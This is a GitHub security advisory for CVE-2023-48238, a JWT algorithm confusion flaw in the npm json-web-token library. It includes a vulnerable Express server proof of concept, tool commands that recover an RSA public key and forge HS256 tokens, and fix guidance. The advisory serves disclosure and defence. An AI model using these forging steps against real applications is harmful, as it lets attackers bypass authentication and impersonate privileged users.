# [H] json-web-token library is vulnerable to a JWT algorithm confusion attack

## Summary
Severity: High
Advisory: GHSA-4xw9-cx39-r355
CVE: CVE-2023-48238
CWE: CWE-20, CWE-345
Ecosystem: npm
CVSS: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:H/A:N (CVSS_V3)
Published: 2023-11-17
Source: https://github.com/advisories/GHSA-4xw9-cx39-r355
Type: github-advisory

## Affected
- npm: `json-web-token` — affected >=0 <4.0.0

## Details
### Summary
The json-web-token library is vulnerable to a JWT algorithm confusion attack.

### Details
On line 86 of the 'index.js' file, the algorithm to use for verifying the signature of the JWT token is taken from the JWT token, which at that point is still unverified and thus shouldn't be trusted. To exploit this vulnerability, an attacker needs to craft a malicious JWT token containing the HS256 algorithm, signed with the public RSA key of the victim application. This attack will only work against this library is the RS256 algorithm is in use, however it is a best practice to use that algorithm.

### PoC
Take a server running the following code:
```javascript
const express = require('express');
const jwt = require('json-web-token');
const fs = require('fs');
const path = require('path');

const app = express();
const port = 3000;

// Load the keys from the file
const publicKeyPath = path.join(__dirname, 'public-key.pem');
const publicKey = fs.readFileSync(publicKeyPath, 'utf8');
const privateKeyPath = path.join(__dirname, 'private-key.pem');
const privateKey = fs.readFileSync(privateKeyPath, 'utf8');

app.use(express.json());

// Endpoint to generate a JWT token with admin: False
app.get('/generateToken', async (req, res) => {
  const payload = { admin: false, name: req.query.name };
  const token = await jwt.encode(privateKey, payload, 'RS256', function (err, token) {
    res.json({ token });
  });
});

// Middleware to verify the JWT token
function verifyToken(req, res, next) {
  const token = req.query.token;

  jwt.decode(publicKey, token, (err, decoded) => {
    if (err) {
      console.log(err)
      return res.status(401).json({ message: 'Token authentication failed' });
    }

    req.decoded = decoded;
    next();
  });
}

// Endpoint to check if you are the admin or not
app.get('/checkAdmin', verifyToken, (req, res) => {
  res.json(req.decoded);
});

app.listen(port, () => {
  console.log(`Server is running on port ${port}`);
});
```

**Public key recovery**
First, an attacker needs to recover the public key from the server in any way possible. It is possible to extract this from just two JWT tokens as shown below.
Grab two different JWT tokens and utilize the following tool: `https://github.com/silentsignal/rsa_sign2n/blob/release/standalone/jwt_forgery.py`
```
python3 jwt_forgery.py token1 token2
```
The tool will generate 4 different public keys, all in different formats. Try the following for all 4 formats.

**Algorithm confusion**
Change the JWT to the HS256 algorithm and modify any of the contents to your liking at `https://jwt.io/`.
Copy the resulting JWT token and use with the following tool: `https://github.com/ticarpi/jwt_tool`.
```
python /opt/jwt_tool/jwt_tool.py --exploit k -pk public_key token
```
You will now get a resulting JWT token that is validly signed.

### Impact
Applications using the RS256 algorithm, are vulnerable to this algorithm confusion attack which allows attackers to sign arbitrary payloads that the verifier will accept.

### Solution
Either one of the following solutions will work.
1. Change the signature of the `decode` function to ensure that the algorithm is set in that call
2. Check whether or not the secret could be a public key in the decode function and in that case, set the key to be a public key.


> Fixed in 4.0.0. Both encode and decode now reject combinations where the key type (PEM vs plain secret) doesn't match the algorithm family. Upgrade with npm install json-web-token@^4.

## References
- https://github.com/joaquimserafim/json-web-token/security/advisories/GHSA-4xw9-cx39-r355
- https://nvd.nist.gov/vuln/detail/CVE-2023-48238
- https://github.com/joaquimserafim/json-web-token/commit/b6e56b1346f48432d29133c76b65222ad93956b7
- https://github.com/joaquimserafim/json-web-token
- https://github.com/joaquimserafim/json-web-token/blob/acf6a462471e1b14187eb77414e9161b8b7bff7e/index.js#L86
